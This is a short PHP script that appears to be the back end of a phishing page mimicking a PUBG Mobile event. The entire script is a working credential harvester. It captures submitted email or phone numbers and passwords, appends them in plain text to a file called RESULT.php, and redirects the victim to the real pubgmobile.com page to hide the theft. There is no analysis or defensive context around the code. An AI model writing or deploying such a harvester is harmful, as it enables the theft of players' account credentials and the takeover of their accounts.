<?php
header ("Location: https://www.pubgmobile.com/act/a20180515iggame/");
$ADEx = "RESULT.php";
$ADEy = $_POST['email'];
$ADEz = $_POST['password'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email Or No. Phone : ");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Password         : ");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
